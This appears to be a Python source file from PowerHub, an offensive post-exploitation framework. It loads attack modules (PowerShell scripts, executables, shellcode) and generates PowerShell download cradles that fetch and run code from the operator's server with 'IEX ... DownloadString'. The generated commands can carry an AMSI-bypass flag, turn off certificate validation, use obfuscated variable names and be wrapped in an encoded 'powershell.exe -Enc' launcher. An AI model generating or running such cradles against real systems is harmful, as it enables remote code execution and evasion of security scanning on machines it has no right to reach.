import logging
import os
import binascii

import magic

from powerhub.env import powerhub_app as ph_app
from powerhub.directories import MOD_DIR
from powerhub.obfuscation import symbol_name
from powerhub.tools import encrypt_aes

log = logging.getLogger(__name__)


def get_module_type(filename, file_type, mime):
    """Determine module type based on file name, type and mime type"""

    if '.Net assembly' in file_type and filename.endswith('.exe'):
        return 'dotnet'
    elif file_type.startswith('PE32') and filename.endswith('.exe'):
        return 'pe'
    elif filename.endswith('.ps1'):
        return 'ps1'
    elif file_type == 'data':
        return 'shellcode'
    return None


def sanitize_ps1(buffer, file_type):
    """Remove BOM and make sure it's UTF-8"""

    if 'UTF-8 (with BOM)' in file_type:
        return buffer.decode('utf-8-sig').encode()
    elif 'UTF-16 (with BOM)' in file_type:
        return buffer.decode('utf-16').encode()
    elif 'UTF-16, little-endian' in file_type:
        return buffer.decode('utf-16').encode()
    elif 'UTF-16, big-endian' in file_type:
        return buffer.decode('utf-16').encode()
    elif 'ASCII text' in file_type:
        return buffer
    return buffer


def import_modules():
    """Import all modules and returns them as a list"""
    result = []
    log.info("Importing modules...")
    for dirName, subdirList, fileList in os.walk(MOD_DIR, followlinks=True):
        for fname in fileList:
            if fname.endswith('.tests.ps1'):
                # This is done because PowerSploit contains tests that we
                # don't want
                continue
            _, ext = os.path.splitext(fname)
            if ext.lower() not in ['.exe', '.ps1']:
                continue
            path = os.path.join(dirName, fname)
            with open(path, "br") as f:
                buffer = f.read(2048)
                file_type = magic.from_buffer(buffer)
                mime = magic.from_buffer(buffer, mime=True)
                mod_type = get_module_type(fname, file_type, mime)
                if not mod_type:
                    continue
            log.debug("Imported module (%s): %s" % (path, mod_type))
            module = Module(
                path.replace(MOD_DIR, ''),
                path,
                mod_type,
                file_type,
            )
            result.append(module)

    for i, m in enumerate(result):
        m.n = i

    return result


class Module(object):
    """Represents a module

    """

    def __init__(self, name, path, type, file_type):
        self.name = name
        self.path = path
        self.type = type
        self.file_type = file_type
        self.code = ""
        self.active = False
        self.n = -1

    def activate(self):
        self.active = True
        self.code = open(self.path, 'rb').read()
        if self.type == 'ps1':
            self.code = sanitize_ps1(self.code, self.file_type)

    def deactivate(self):
        self.active = False
        self.code = ""

    def __dict__(self):
        return {
            "Name": self.name,
            "BaseName": os.path.basename(self.name),
            "Code": self.code,
            "N": self.n,
            "Type": self.type,
            "Loaded": "$True" if self.code else "$False",
            "Alias": "$Null",
        }


modules = import_modules()

callback_urls = {
    'http': 'http://%s:%d/%s' % (
        ph_app.args.URI_HOST,
        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
    ),
    'https': 'https://%s:%d/%s' % (
        ph_app.args.URI_HOST,
        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
    ),
}

# TODO consider https
webdav_url = 'http://%s:%d/webdav' % (
    ph_app.args.URI_HOST,
    ph_app.args.LPORT,
)


def build_crade_https(get_args):
    result = ''

    if get_args['Transport'] == 'https':
        if get_args['NoVerification'] == 'true':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={$true};")
        elif get_args['Fingerprint'] == 'true':
            from powerhub.reverseproxy import FINGERPRINT
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={param($1,$2);"
                       "$2.Thumbprint -eq '%s'};" %
                       FINGERPRINT.replace(':', ''))
        elif get_args['CertStore'] == 'true':
            pass
        if get_args['TLS1.2'] == 'true':
            result += ("[Net.ServicePointManager]::SecurityProtocol="
                       "[Net.SecurityProtocolType]::Tls12;")

    return result


def build_cradle_webclient(get_args, key):
    result = ''
    web_client = symbol_name('web_client')

    if get_args['Transport'].startswith('http'):
        result += "$%(web_client)s=New-Object Net.WebClient;"

        if get_args['Proxy'] == 'true':
            result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                       "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                       "DefaultCredentials;")

        url = callback_urls[get_args['Transport']]

        query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
        if not get_args['ClipExec'] == 'none':
            query += "&c=%(ClipExec)s" % get_args['ClipExec']

        if get_args['Minimal'] == 'true':
            query += "&m=t"

        query = encrypt_aes(query, key)
        # Make b64 encoding urlsafe
        query = query.replace('/', '_').replace('+', '-')

        result += "IEX $%(web_client)s.DownloadString('%(url)s%(query)s')"
        result = result % dict(
            url=url,
            query=query,
            web_client=web_client,
        )

    return result


def build_cradle(get_args, key):
    """Build the download crade given a dict of GET arguments"""
    log.debug("GET arguments: %s" % get_args)

    result = ""
    key_var = symbol_name('global_key')

    result += build_crade_https(get_args)

    if get_args['KEX'] == 'oob' and key:
        result += "$%(key_var)s='%(key)s';"

    result += build_cradle_webclient(get_args, key)

    result = result % dict(
        url=callback_urls[get_args['Transport']],
        transport=get_args['Transport'],
        amsi=get_args['Amsi'],
        key_var=key_var,
        key=key,
    )

    # make sure to only use single quotes
    assert '"' not in result

    powershell_exe = 'powershell.exe'

    if get_args['Launcher'] == 'cmd':
        result = '%s "%s"' % (powershell_exe, result)
    elif get_args['Launcher'] == 'cmd_enc':
        result = '%s -Enc %s' % (
            powershell_exe,
            binascii.b2a_base64(result.encode('utf-16le')).decode())
    elif get_args['Launcher'] == 'bash':
        result = result.replace('$', '\\$')
        result = '"%s \\\"%s\\\""' % (powershell_exe, result)

    return result
